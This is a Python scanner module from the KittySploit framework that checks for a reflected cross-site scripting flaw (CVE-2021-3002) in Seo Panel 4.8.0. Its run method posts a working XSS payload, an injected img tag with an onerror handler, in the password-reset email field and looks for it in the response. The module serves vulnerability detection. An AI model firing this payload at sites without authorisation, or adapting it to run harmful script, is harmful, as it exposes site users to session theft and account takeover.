#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seo Panel 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seo Panel 4.8.0 - Cross-Site Scripting Detection',
        'description': 'Seo Panel 4.8.0 contains a reflected cross-site scripting vulnerability via the seo/seopanel/login.php?sec=forgot email parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'seopanel', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://www.cinquino.eu/SeoPanelReflect.htm',
            'https://github.com/seopanel/Seo-Panel/issues/202',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3002',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ArrestX/--POC',
        ],
        'cve': 'CVE-2021-3002',
    }

    def run(self):
        path = '/seo/seopanel/login.php?sec=forgot'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3e11&code=AAAAA&login=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=a onerror=alert(document.domain)>', 'seopanel',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Seo Panel 4.8.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

